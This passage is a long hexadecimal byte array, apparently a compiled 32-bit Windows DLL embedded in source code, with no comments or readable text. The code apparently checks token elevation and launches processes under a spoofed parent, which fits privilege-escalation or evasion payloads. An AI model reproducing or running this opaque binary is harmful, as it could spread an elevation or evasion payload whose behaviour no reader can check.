	0xF7, 0x8D, 0x95, 0x88, 0xFD, 0xFF, 0xFF, 0x8D, 0x8D, 0x78, 0xF9, 0xFF, 0xFF, 0xE8, 0x35, 0x0A,
	0x00, 0x00, 0xBA, 0xA8, 0x41, 0x00, 0x10, 0xE8, 0x79, 0x09, 0x00, 0x00, 0xBA, 0xAC, 0x41, 0x00,
	0x10, 0x8D, 0x8D, 0x78, 0xF9, 0xFF, 0xFF, 0xE8, 0x69, 0x09, 0x00, 0x00, 0xBA, 0xB0, 0x41, 0x00,
	0x10, 0x8D, 0x8D, 0x78, 0xF9, 0xFF, 0xFF, 0xE8, 0x59, 0x09, 0x00, 0x00, 0xBA, 0xB4, 0x41, 0x00,
	0x10, 0x8D, 0x8D, 0x78, 0xF9, 0xFF, 0xFF, 0xE8, 0x49, 0x09, 0x00, 0x00, 0x33, 0xD2, 0x8D, 0x8D,
	0x78, 0xF9, 0xFF, 0xFF, 0x8B, 0xFA, 0x89, 0x55, 0xFC, 0xE9, 0x2D, 0xFF, 0xFF, 0xFF, 0x55, 0x8B,
	0xEC, 0x81, 0xEC, 0x98, 0x06, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0xF2, 0x8B, 0xC1, 0x33, 0xD2,
	0x89, 0x75, 0xEC, 0x89, 0x45, 0xE8, 0x89, 0x55, 0xF8, 0x89, 0x55, 0xF4, 0x6A, 0x10, 0x5B, 0x89,
	0x5D, 0xF0, 0x85, 0xC0, 0x0F, 0x84, 0xD8, 0x00, 0x00, 0x00, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0x8D,
	0x85, 0x7C, 0xFD, 0xFF, 0xFF, 0x88, 0x10, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0xB2, 0x01, 0x8D,
	0x8D, 0x7C, 0xFD, 0xFF, 0xFF, 0xE8, 0x81, 0xF9, 0xFF, 0xFF, 0x6A, 0x44, 0x5A, 0x8B, 0xCA, 0x8D,
	0x45, 0x8C, 0xC6, 0x00, 0x00, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF7, 0x8D, 0x4D, 0x8C, 0x89, 0x55,
	0x8C, 0xE8, 0x8D, 0xFD, 0xFF, 0xFF, 0x85, 0xF6, 0x0F, 0x84, 0x99, 0x00, 0x00, 0x00, 0x8B, 0x75,
	0x08, 0x85, 0xF6, 0x0F, 0x84, 0x8E, 0x00, 0x00, 0x00, 0x8D, 0x8E, 0x00, 0x10, 0x00, 0x00, 0xE8,
	0x1B, 0xF9, 0xFF, 0xFF, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x1B, 0x56, 0xFF, 0x75, 0xEC, 0xC7, 0x45,
	0xF0, 0x00, 0x00, 0x00, 0x00, 0x57, 0xC7, 0x45, 0xF8, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xEE, 0x16,
	0x00, 0x00, 0x83, 0xC4, 0x0C, 0x8B, 0x4D, 0xF4, 0x6A, 0x05, 0x58, 0x66, 0x89, 0x45, 0xBC, 0x8D,
	0x45, 0xD8, 0xC7, 0x45, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0x40, 0x83, 0xEB, 0x01,
	0x75, 0xF7, 0x8D, 0x45, 0xD8, 0x50, 0x8D, 0x45, 0x8C, 0x50, 0x8D, 0x85, 0x7C, 0xFD, 0xFF, 0xFF,
	0x50, 0x53, 0xFF, 0x75, 0xF0, 0x53, 0x53, 0x53, 0x57, 0x51, 0xFF, 0x55, 0xE8, 0x8B, 0xD8, 0x85,
	0xDB, 0x74, 0x10, 0xFF, 0x75, 0xD8, 0x8B, 0x35, 0x20, 0x41, 0x00, 0x10, 0xFF, 0xD6, 0xFF, 0x75,
	0xDC, 0xFF, 0xD6, 0x83, 0x7D, 0xF8, 0x00, 0x74, 0x07, 0x8B, 0xCF, 0xE8, 0xB5, 0xF8, 0xFF, 0xFF,
	0x8B, 0xC3, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0xB9, 0x10, 0x04, 0x00, 0x00, 0x8D, 0x85, 0x6C, 0xF9,
	0xFF, 0xFF, 0xC6, 0x00, 0x00, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF7, 0x8D, 0x95, 0x7C, 0xFD, 0xFF,
	0xFF, 0x8D, 0x8D, 0x6C, 0xF9, 0xFF, 0xFF, 0xE8, 0xBB, 0x08, 0x00, 0x00, 0xBA, 0xA8, 0x41, 0x00,
	0x10, 0xE8, 0xFF, 0x07, 0x00, 0x00, 0xBA, 0xAC, 0x41, 0x00, 0x10, 0x8D, 0x8D, 0x6C, 0xF9, 0xFF,
	0xFF, 0xE8, 0xEF, 0x07, 0x00, 0x00, 0xBA, 0xB0, 0x41, 0x00, 0x10, 0x8D, 0x8D, 0x6C, 0xF9, 0xFF,
	0xFF, 0xE8, 0xDF, 0x07, 0x00, 0x00, 0xBA, 0xB4, 0x41, 0x00, 0x10, 0x8D, 0x8D, 0x6C, 0xF9, 0xFF,
	0xFF, 0xE8, 0xCF, 0x07, 0x00, 0x00, 0x33, 0xFF, 0x8D, 0x8D, 0x6C, 0xF9, 0xFF, 0xFF, 0x89, 0x7D,
	0xF8, 0xE9, 0x32, 0xFF, 0xFF, 0xFF, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x5C, 0x06, 0x00, 0x00, 0x53,
	0x56, 0x57, 0x33, 0xDB, 0x8B, 0xF2, 0x8B, 0xF9, 0x89, 0x5D, 0xF8, 0xE8, 0xD0, 0x03, 0x00, 0x00,
	0x85, 0xC0, 0x0F, 0x84, 0x3D, 0x01, 0x00, 0x00, 0x85, 0xFF, 0x74, 0x2F, 0x85, 0xF6, 0x74, 0x2B,
	0x8D, 0x8E, 0x00, 0x10, 0x00, 0x00, 0xE8, 0xF4, 0xF7, 0xFF, 0xFF, 0x8B, 0xC8, 0x89, 0x4D, 0xFC,
	0x85, 0xC9, 0x74, 0x73, 0x56, 0x57, 0x51, 0xC7, 0x45, 0xF8, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xCD,
	0x15, 0x00, 0x00, 0x8B, 0x75, 0xFC, 0x83, 0xC4, 0x0C, 0xEB, 0x5E, 0xB9, 0x10, 0x04, 0x00, 0x00,
	0x8D, 0x85, 0xA8, 0xF9, 0xFF, 0xFF, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0xB9, 0x0A,
	0x02, 0x00, 0x00, 0x8D, 0x85, 0xB8, 0xFD, 0xFF, 0xFF, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75,
	0xF8, 0x32, 0xD2, 0x8D, 0x8D, 0xB8, 0xFD, 0xFF, 0xFF, 0xE8, 0xCD, 0xF7, 0xFF, 0xFF, 0x8D, 0x95,
	0xB8, 0xFD, 0xFF, 0xFF, 0x8D, 0x8D, 0xA8, 0xF9, 0xFF, 0xFF, 0xE8, 0xD8, 0x07, 0x00, 0x00, 0xBA,
	0xC0, 0x41, 0x00, 0x10, 0xE8, 0x1C, 0x07, 0x00, 0x00, 0x8D, 0xB5, 0xA8, 0xF9, 0xFF, 0xFF, 0x89,
	0x5D, 0xF8, 0x89, 0x75, 0xFC, 0xEB, 0x02, 0x8B, 0xF0, 0x6A, 0x1C, 0x5A, 0x8B, 0xCA, 0x8D, 0x45,
	0xCC, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x89, 0x55, 0xCC, 0xC7, 0x45, 0xD0, 0xFF,
	0xFF, 0xFF, 0xFF, 0xE8, 0x64, 0x05, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x27, 0x8D, 0x4D, 0xCC, 0xE8,
	0x77, 0x05, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x61, 0x6A, 0x0A, 0x5F, 0xB9, 0xF4, 0x01, 0x00, 0x00,
	0xE8, 0x60, 0xFB, 0xFF, 0xFF, 0xE8, 0x42, 0x05, 0x00, 0x00, 0x83, 0xEF, 0x01, 0x75, 0xEC, 0x85,
	0xC0, 0x74, 0x46, 0x6A, 0x10, 0x5A, 0x8D, 0x4D, 0xE8, 0x88, 0x19, 0x41, 0x83, 0xEA, 0x01, 0x75,
	0xF8, 0x8B, 0xC8, 0xE8, 0x22, 0x04, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x2B, 0x8D, 0x45,
	0xE8, 0x8B, 0xD7, 0x50, 0x51, 0x51, 0x8B, 0xCE, 0xE8, 0x55, 0x03, 0x00, 0x00, 0x8B, 0x35, 0x2C,
	0x40, 0x00, 0x10, 0x8B, 0xD8, 0x83, 0xC4, 0x0C, 0x85, 0xDB, 0x74, 0x0A, 0xFF, 0x75, 0xEC, 0xFF,
	0xD6, 0xFF, 0x75, 0xE8, 0xFF, 0xD6, 0x57, 0xFF, 0xD6, 0x83, 0x7D, 0xD0, 0xFF, 0x74, 0x08, 0x8D,
	0x4D, 0xCC, 0xE8, 0x2A, 0x01, 0x00, 0x00, 0x83, 0x7D, 0xF8, 0x00, 0x74, 0x08, 0x8B, 0x4D, 0xFC,
	0xE8, 0xE0, 0xF6, 0xFF, 0xFF, 0x5F, 0x5E, 0x8B, 0xC3, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83,
	0xEC, 0x0C, 0x56, 0x57, 0x8B, 0xFA, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xF4,
	0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xF8, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x6C, 0x40, 0x00,
	0x10, 0x8D, 0x4D, 0xFC, 0x51, 0x6A, 0x08, 0x50, 0xFF, 0x15, 0xEC, 0x40, 0x00, 0x10, 0x8B, 0xF0,
	0x85, 0xF6, 0x78, 0x20, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0x04, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0x12,
	0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x18, 0x41, 0x00, 0x10, 0xFF, 0x75, 0xFC, 0x8B, 0xF0, 0xFF, 0x15,
	0x20, 0x41, 0x00, 0x10, 0x85, 0xFF, 0x74, 0x05, 0x8B, 0x45, 0xF8, 0x89, 0x07, 0xF7, 0xD6, 0xC1,
	0xEE, 0x1F, 0x5F, 0x8B, 0xC6, 0x5E, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x30, 0x33, 0xC0,
	0xC7, 0x45, 0xD0, 0x18, 0x00, 0x00, 0x00, 0x56, 0x57, 0x8B, 0xFA, 0x89, 0x45, 0xD4, 0x89, 0x45,
	0xD8, 0x89, 0x45, 0xDC, 0x89, 0x45, 0xE0, 0x89, 0x45, 0xE4, 0x89, 0x4D, 0xE8, 0x89, 0x45, 0xEC,
	0x85, 0xFF, 0x74, 0x02, 0x89, 0x07, 0x8D, 0x45, 0xE8, 0x50, 0x8D, 0x45, 0xD0, 0x50, 0x68, 0x00,
	0x00, 0x00, 0x02, 0x8D, 0x45, 0xF4, 0x50, 0xFF, 0x15, 0x10, 0x41, 0x00, 0x10, 0x8B, 0xF0, 0x85,
	0xF6, 0x78, 0x58, 0x8D, 0x45, 0xF8, 0x50, 0x6A, 0x08, 0xFF, 0x75, 0xF4, 0xFF, 0x15, 0xEC, 0x40,
	0x00, 0x10, 0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x3A, 0x8D, 0x45, 0xF0, 0xC7, 0x45, 0xFC, 0x00, 0x00,
	0x00, 0x00, 0x50, 0x6A, 0x04, 0x8D, 0x45, 0xFC, 0x50, 0x6A, 0x14, 0xFF, 0x75, 0xF8, 0xFF, 0x15,
	0x18, 0x41, 0x00, 0x10, 0x8B, 0xF0, 0x85, 0xF6, 0x78, 0x0F, 0x85, 0xFF, 0x74, 0x0B, 0x33, 0xC0,
	0x3B, 0x45, 0xFC, 0x1B, 0xC0, 0xF7, 0xD8, 0x89, 0x07, 0xFF, 0x75, 0xF8, 0xFF, 0x15, 0x20, 0x41,
	0x00, 0x10, 0xFF, 0x75, 0xF4, 0xFF, 0x15, 0x20, 0x41, 0x00, 0x10, 0x5F, 0x8B, 0xC6, 0x5E, 0xC9,
	0xC3, 0x57, 0x8B, 0xF9, 0x85, 0xFF, 0x74, 0x1C, 0x83, 0x3F, 0x1C, 0x72, 0x17, 0xFF, 0x77, 0x18,
	0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0xFF, 0x77, 0x04, 0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0x33,
	0xC0, 0x40, 0x5F, 0xC3, 0x33, 0xC0, 0x5F, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x30, 0x53, 0x56,
	0x57, 0x8B, 0xF9, 0x85, 0xFF, 0x0F, 0x84, 0xD9, 0x00, 0x00, 0x00, 0x8B, 0x75, 0x10, 0x85, 0xF6,
	0x0F, 0x84, 0xCE, 0x00, 0x00, 0x00, 0x83, 0x3E, 0x1C, 0x0F, 0x82, 0xC5, 0x00, 0x00, 0x00, 0x6A,
	0x14, 0x8D, 0x5E, 0x08, 0x33, 0xD2, 0x59, 0x8B, 0xC3, 0x88, 0x10, 0x40, 0x83, 0xE9, 0x01, 0x75,
	0xF8, 0x6A, 0x0C, 0x58, 0x8B, 0xC8, 0x8D, 0x45, 0xEC, 0x88, 0x10, 0x40, 0x83, 0xE9, 0x01, 0x75,
	0xF8, 0x6A, 0x18, 0x58, 0x8B, 0xC8, 0x8D, 0x45, 0xD4, 0x88, 0x10, 0x40, 0x83, 0xE9, 0x01, 0x75,
	0xF8, 0x6A, 0x0C, 0x58, 0x6A, 0x18, 0x59, 0x66, 0x89, 0x45, 0xEE, 0x33, 0xC0, 0x52, 0x40, 0xC7,
	0x45, 0xF0, 0x03, 0x00, 0x00, 0x00, 0x52, 0x50, 0x52, 0x66, 0x89, 0x45, 0xEC, 0x89, 0x45, 0xF4,
	0x66, 0x89, 0x4D, 0xD6, 0x66, 0x89, 0x45, 0xD4, 0xFF, 0x15, 0x20, 0x40, 0x00, 0x10, 0x89, 0x46,
	0x18, 0x85, 0xC0, 0x74, 0x5F, 0x6A, 0x00, 0x57, 0xFF, 0x15, 0x14, 0x40, 0x00, 0x10, 0xA8, 0x10,
	0xB9, 0x00, 0x00, 0x00, 0x40, 0xB8, 0x00, 0x00, 0x20, 0x42, 0x0F, 0x44, 0xC1, 0x50, 0x6A, 0x03,
	0x6A, 0x00, 0x6A, 0x07, 0x68, 0x00, 0x00, 0x00, 0x80, 0x57, 0xFF, 0x15, 0x74, 0x40, 0x00, 0x10,
	0x89, 0x46, 0x04, 0x83, 0xF8, 0xFF, 0x74, 0x2C, 0x53, 0x33, 0xD2, 0x8D, 0x4D, 0xF8, 0x51, 0x52,
	0x52, 0x52, 0x52, 0x68, 0x00, 0x00, 0x09, 0x00, 0x50, 0x89, 0x55, 0xF8, 0xFF, 0x15, 0x68, 0x40,
	0x00, 0x10, 0xFF, 0x15, 0x24, 0x40, 0x00, 0x10, 0x3D, 0xE5, 0x03, 0x00, 0x00, 0x75, 0x05, 0x33,
	0xC0, 0x40, 0xEB, 0x02, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x51, 0x8D,
	0x45, 0xFC, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x50, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xD4,
	0x40, 0x00, 0x10, 0x83, 0x7D, 0xFC, 0x00, 0x74, 0x32, 0xFF, 0x15, 0x40, 0x40, 0x00, 0x10, 0x3B,
	0x45, 0xFC, 0x75, 0x27, 0x6A, 0x04, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xB4, 0x40, 0x00, 0x10, 0x85,
	0xC0, 0x75, 0x18, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xB8, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x0B,
	0x6A, 0x00, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xBC, 0x40, 0x00, 0x10, 0x33, 0xC0, 0x40, 0xC9, 0xC3,
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x20, 0x56, 0x8D, 0x45, 0xFC, 0x33, 0xF6, 0x50, 0x68, 0x00, 0x00,
	0x00, 0x02, 0x6A, 0xFF, 0x89, 0x75, 0xFC, 0x89, 0x75, 0xF4, 0x89, 0x75, 0xF8, 0xFF, 0x15, 0xEC,
	0x40, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x57, 0x6A, 0x04, 0x59, 0x8D, 0x45, 0xF8, 0x89, 0x4D, 0xF8,
	0x50, 0x51, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0x1A, 0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x0C, 0x40, 0x00,
	0x10, 0x85, 0xC0, 0x74, 0x39, 0x39, 0x75, 0xF4, 0x74, 0x34, 0x6A, 0x14, 0x59, 0x8D, 0x45, 0xF8,
	0x89, 0x4D, 0xF8, 0x50, 0x51, 0x8D, 0x45, 0xE0, 0x50, 0x6A, 0x19, 0xFF, 0x75, 0xFC, 0xFF, 0x15,
	0x0C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x16, 0x56, 0xFF, 0x75, 0xE0, 0xFF, 0x15, 0x08, 0x40,
	0x00, 0x10, 0x33, 0xC9, 0x41, 0x81, 0x38, 0x00, 0x30, 0x00, 0x00, 0x0F, 0x43, 0xF1, 0x83, 0x7D,
	0xFC, 0x00, 0x74, 0x09, 0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x20, 0x41, 0x00, 0x10, 0x8B, 0xC6, 0x5E,
	0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x5C, 0x53, 0x33, 0xDB, 0x89, 0x55, 0xF4, 0x56, 0x89,
	0x4D, 0xF0, 0x89, 0x5D, 0xF8, 0x39, 0x5D, 0x10, 0x0F, 0x84, 0x96, 0x00, 0x00, 0x00, 0x8D, 0x45,
	0xF8, 0x50, 0x53, 0x6A, 0x01, 0x53, 0xFF, 0x15, 0x60, 0x40, 0x00, 0x10, 0x8B, 0x4D, 0xF8, 0xE8,
	0x7B, 0xF3, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x7A, 0x6A, 0x48, 0x5A, 0x8B, 0xCA, 0x8D,
	0x45, 0xA4, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x6A, 0x05, 0x58, 0x66, 0x89, 0x45,
	0xD4, 0x8D, 0x45, 0xF8, 0x50, 0x53, 0x6A, 0x01, 0x56, 0x89, 0x55, 0xA4, 0xC7, 0x45, 0xD0, 0x81,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0x60, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x40, 0x53, 0x53, 0x6A,
	0x04, 0x8D, 0x45, 0xF4, 0x50, 0x68, 0x00, 0x00, 0x02, 0x00, 0x53, 0x56, 0xFF, 0x15, 0x28, 0x40,
	0x00, 0x10, 0x85, 0xC0, 0x74, 0x20, 0xFF, 0x75, 0x10, 0x8D, 0x45, 0xA4, 0x89, 0x75, 0xE8, 0x50,
	0x53, 0x53, 0x68, 0x10, 0x00, 0x08, 0x00, 0x53, 0x53, 0x53, 0xFF, 0x75, 0xF0, 0x53, 0xFF, 0x15,
	0x44, 0x40, 0x00, 0x10, 0x8B, 0xD8, 0x56, 0xFF, 0x15, 0x38, 0x40, 0x00, 0x10, 0x8B, 0xCE, 0xE8,
	0x11, 0xF3, 0xFF, 0xFF, 0x5E, 0x8B, 0xC3, 0x5B, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x51, 0x53, 0x56,
	0x57, 0x68, 0xD0, 0x41, 0x00, 0x10, 0x8B, 0xD9, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x33,
	0xF6, 0xFF, 0x15, 0x30, 0x40, 0x00, 0x10, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x3C, 0x68, 0xE8, 0x41,
	0x00, 0x10, 0x57, 0xFF, 0x15, 0x3C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x05, 0x53, 0xFF, 0xD0,
	0x8B, 0xF0, 0x57, 0xFF, 0x15, 0x48, 0x40, 0x00, 0x10, 0x85, 0xF6, 0x74, 0x1C, 0x6A, 0x02, 0x6A,
	0x00, 0x6A, 0x00, 0x8D, 0x45, 0xFC, 0x50, 0x6A, 0xFF, 0x6A, 0xFF, 0x56, 0xFF, 0x15, 0x18, 0x40,
	0x00, 0x10, 0x56, 0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0x8B, 0x45, 0xFC, 0x5F, 0x5E, 0x5B, 0xC9,
	0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0x8D, 0x45, 0xF8,
	0x33, 0xDB, 0x50, 0x57, 0x89, 0x5D, 0xF8, 0x89, 0x5D, 0xFC, 0x89, 0x5D, 0xF4, 0xFF, 0x15, 0xD4,
	0x40, 0x00, 0x10, 0x39, 0x5D, 0xF8, 0x74, 0x30, 0xFF, 0x75, 0xF8, 0x53, 0x68, 0x00, 0x10, 0x00,
	0x00, 0xFF, 0x15, 0x1C, 0x40, 0x00, 0x10, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x1B, 0x8D, 0x45, 0xFC,
	0x50, 0x68, 0x00, 0x00, 0x00, 0x02, 0x56, 0xFF, 0x15, 0x04, 0x40, 0x00, 0x10, 0x56, 0x85, 0xC0,
	0x75, 0x0E, 0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0x33, 0xC0, 0x40, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3,
	0x8B, 0x35, 0x2C, 0x40, 0x00, 0x10, 0xFF, 0xD6, 0x8D, 0x45, 0xF0, 0x89, 0x5D, 0xF0, 0x50, 0x6A,
	0x04, 0x8D, 0x45, 0xF4, 0x50, 0x6A, 0x12, 0xFF, 0x75, 0xFC, 0xFF, 0x15, 0x0C, 0x40, 0x00, 0x10,
	0xFF, 0x75, 0xFC, 0x85, 0xC0, 0x75, 0x04, 0xFF, 0xD6, 0xEB, 0xCD, 0xFF, 0xD6, 0x83, 0x7D, 0xF4,
	0x02, 0x75, 0xC5, 0x8B, 0x45, 0x0C, 0x89, 0x38, 0x33, 0xC0, 0xEB, 0xBF, 0x55, 0x8B, 0xEC, 0x51,
	0x8D, 0x45, 0xFC, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x50, 0x68, 0xC1, 0x1E, 0x00, 0x10,
	0xFF, 0x15, 0xC0, 0x40, 0x00, 0x10, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC,
	0x90, 0x0C, 0x00, 0x00, 0x53, 0x56, 0x8B, 0xF1, 0xC7, 0x45, 0xFC, 0x01, 0x00, 0x00, 0x00, 0x33,
	0xDB, 0x85, 0xF6, 0x0F, 0x84, 0xC5, 0x00, 0x00, 0x00, 0x83, 0x3E, 0x1C, 0x0F, 0x82, 0xBC, 0x00,
	0x00, 0x00, 0xB9, 0x10, 0x04, 0x00, 0x00, 0x8D, 0x85, 0x90, 0xFB, 0xFF, 0xFF, 0x88, 0x18, 0x40,
	0x83, 0xE9, 0x01, 0x75, 0xF8, 0x32, 0xD2, 0x8D, 0x8D, 0x90, 0xFB, 0xFF, 0xFF, 0xE8, 0xB9, 0xF1,
	0xFF, 0xFF, 0x8D, 0x95, 0x90, 0xFB, 0xFF, 0xFF, 0x8D, 0x8D, 0x70, 0xF3, 0xFF, 0xFF, 0xE8, 0xC4,
	0x01, 0x00, 0x00, 0xBA, 0x10, 0x42, 0x00, 0x10, 0x8D, 0x8D, 0x90, 0xFB, 0xFF, 0xFF, 0xE8, 0x02,
	0x01, 0x00, 0x00, 0xBA, 0x40, 0x42, 0x00, 0x10, 0x8D, 0x8D, 0x70, 0xF3, 0xFF, 0xFF, 0xE8, 0xF2,
	0x00, 0x00, 0x00, 0x56, 0x51, 0x51, 0x8D, 0x8D, 0x90, 0xFB, 0xFF, 0xFF, 0xE8, 0xC7, 0xFB, 0xFF,
	0xFF, 0x83, 0xC4, 0x0C, 0x85, 0xC0, 0x74, 0x56, 0x6A, 0x10, 0x59, 0x8D, 0x45, 0xEC, 0x88, 0x18,
	0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x6A, 0x44, 0x5A, 0x8B, 0xCA, 0x8D, 0x45, 0xA0, 0x88, 0x18,
	0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x33, 0xC0, 0x89, 0x55, 0xA0, 0x66, 0x89, 0x45, 0xD0, 0x8D,
	0x45, 0xEC, 0x50, 0x8D, 0x45, 0xA0, 0xC7, 0x45, 0xCC, 0x81, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53,
	0x6A, 0x10, 0x53, 0x53, 0x53, 0x8D, 0x85, 0x70, 0xF3, 0xFF, 0xFF, 0x50, 0x53, 0xFF, 0x15, 0x44,
	0x40, 0x00, 0x10, 0x85, 0xC0, 0x75, 0x0D, 0x8B, 0xCE, 0xE8, 0x43, 0xFB, 0xFF, 0xFF, 0x33, 0xC0,
	0x5E, 0x5B, 0xC9, 0xC3, 0xFF, 0x75, 0xF0, 0xFF, 0x15, 0x2C, 0x40, 0x00, 0x10, 0x68, 0xB8, 0x0B,
	0x00, 0x00, 0xFF, 0x75, 0xEC, 0xFF, 0x15, 0x34, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x75, 0x19, 0x8D,
	0x45, 0xFC, 0x50, 0xFF, 0x75, 0xEC, 0xFF, 0x15, 0x4C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x08,
	0x33, 0xDB, 0x39, 0x5D, 0xFC, 0x0F, 0x94, 0xC3, 0xFF, 0x75, 0xEC, 0xFF, 0x15, 0x2C, 0x40, 0x00,
	0x10, 0x85, 0xDB, 0x75, 0x07, 0x8B, 0xCE, 0xE8, 0xF5, 0xFA, 0xFF, 0xFF, 0x8B, 0xC3, 0xEB, 0xB0,
	0x8B, 0xD1, 0x56, 0x8B, 0xF2, 0x85, 0xD2, 0x75, 0x04, 0x33, 0xC0, 0x5E, 0xC3, 0x0F, 0xB7, 0x02,
	0x66, 0x85, 0xC0, 0x74, 0x1C, 0x57, 0x8B, 0xF8, 0x83, 0xC2, 0x02, 0x66, 0x83, 0xFF, 0x5C, 0x8B,
	0xC2, 0x0F, 0x45, 0xC6, 0x8B, 0xF0, 0x0F, 0xB7, 0x0A, 0x8B, 0xF9, 0x66, 0x85, 0xC9, 0x75, 0xE8,
	0x5F, 0x8B, 0xC6, 0x5E, 0xC3, 0x85, 0xC9, 0x74, 0x2E, 0x85, 0xD2, 0x74, 0x2A, 0x33, 0xC0, 0xEB,
	0x03, 0x83, 0xC1, 0x02, 0x66, 0x39, 0x01, 0x75, 0xF8, 0x0F, 0xB7, 0x02, 0x66, 0x85, 0xC0, 0x74,
	0x11, 0x2B, 0xD1, 0x66, 0x89, 0x01, 0x83, 0xC1, 0x02, 0x0F, 0xB7, 0x04, 0x0A, 0x66, 0x85, 0xC0,
	0x75, 0xF1, 0x33, 0xC0, 0x66, 0x89, 0x01, 0x8B, 0xC1, 0xC3, 0x55, 0x8B, 0xEC, 0x51, 0x53, 0x57,
	0x8B, 0xDA, 0x8B, 0xF9, 0x3B, 0xFB, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x67, 0x85, 0xFF, 0x75, 0x05,
	0x83, 0xC8, 0xFF, 0xEB, 0x5E, 0x85, 0xDB, 0x75, 0x05, 0x33, 0xC0, 0x40, 0xEB, 0x55, 0x2B, 0xFB,
	0x56, 0x0F, 0xB7, 0x34, 0x1F, 0x8B, 0xC6, 0x6A, 0x19, 0x8D, 0x48, 0xBF, 0x83, 0xC0, 0x20, 0x0F,
	0xB7, 0xD0, 0x8B, 0xC6, 0x5E, 0x66, 0x3B, 0xCE, 0x0F, 0xB7, 0x33, 0x6A, 0x19, 0x0F, 0x47, 0xD0,
	0x8D, 0x5B, 0x02, 0x0F, 0xB7, 0xC2, 0x89, 0x45, 0xFC, 0x8B, 0xC6, 0x8D, 0x48, 0xBF, 0x83, 0xC0,
	0x20, 0x0F, 0xB7, 0xD0, 0x8B, 0xC6, 0x5E, 0x66, 0x3B, 0xCE, 0x0F, 0x47, 0xD0, 0x8B, 0x45, 0xFC,
	0x0F, 0xB7, 0xCA, 0x66, 0x85, 0xC0, 0x74, 0x05, 0x66, 0x3B, 0xC1, 0x74, 0xB4, 0x0F, 0xB7, 0xC0,
	0x2B, 0xC1, 0x5E, 0x5F, 0x5B, 0xC9, 0xC3, 0x85, 0xC9, 0x74, 0x2A, 0x85, 0xD2, 0x74, 0x26, 0x3B,
	0xCA, 0x74, 0x22, 0x56, 0x0F, 0xB7, 0x32, 0x8B, 0xC1, 0x66, 0x85, 0xF6, 0x74, 0x11, 0x2B, 0xD1,
	0x66, 0x89, 0x30, 0x83, 0xC0, 0x02, 0x0F, 0xB7, 0x34, 0x02, 0x66, 0x85, 0xF6, 0x75, 0xF1, 0x33,
	0xD2, 0x66, 0x89, 0x10, 0x5E, 0x8B, 0xC1, 0xC3, 0x8B, 0xC1, 0x85, 0xC9, 0x75, 0x01, 0xC3, 0x33,
	0xD2, 0xEB, 0x03, 0x83, 0xC1, 0x02, 0x66, 0x39, 0x11, 0x75, 0xF8, 0x2B, 0xC8, 0xD1, 0xF9, 0x8B,
